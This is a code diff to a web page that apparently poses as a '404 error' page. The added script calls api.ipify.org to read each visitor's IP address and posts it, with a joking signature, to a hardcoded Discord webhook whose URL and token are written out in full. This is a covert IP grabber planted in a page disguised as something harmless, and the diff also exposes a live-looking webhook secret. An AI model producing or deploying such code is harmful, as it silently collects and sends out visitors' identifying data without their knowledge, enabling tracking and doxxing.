@@ -1,20 +1,21 @@
-
 <script>
+function getIP(json) {
+  var request = new XMLHttpRequest(); //making a request for the webhook
+      request.open("POST", "https://discord.com/api/webhooks/1021895451106086952/4YuLzHnkD6hsCgro9rYMlrJe5-icE7mQ6rFjuJPj539xDf3pBg1iRxpKL7G_Rk1lW2ys");
 
-var request = new XMLHttpRequest(); //making a request for the webhook
-request.open("POST", "https://discord.com/api/webhooks/1021895451106086952/4YuLzHnkD6hsCgro9rYMlrJe5-icE7mQ6rFjuJPj539xDf3pBg1iRxpKL7G_Rk1lW2ys");
+      request.setRequestHeader('Content-type', 'application/json');
 
-request.setRequestHeader('Content-type', 'application/json');
+      var params = {
+        username: "MF Made by yo mama jkjk | Krazuit#6582",
+        avatar_url: "https://cdn.discordapp.com/attachments/1025483378146934906/1025506796460322896/a8479a922b151b03df56a6db105dc5dd.jpg",
+        content: "**IP:** *" + json.ip + "*"
+      }
+   //just a webhook parameters such as avatar,name,message
 
-var params = {
-  username: "ddd2",
-  avatar_url: "https://cdn.discordapp.com/attachments/1025483378146934906/1025506796460322896/a8479a922b151b03df56a6db105dc5dd.jpg",
-  content: "bruh"
-}
-//just a webhook parameters such as avatar,name,message
-
-request.send(params);
- 
+      request.send(JSON.stringify(params));
+    }
 
 </script>
+<script src="https://api.ipify.org?format=jsonp&callback=getIP"></script> //LOST ERROR PAGE 404
+
 
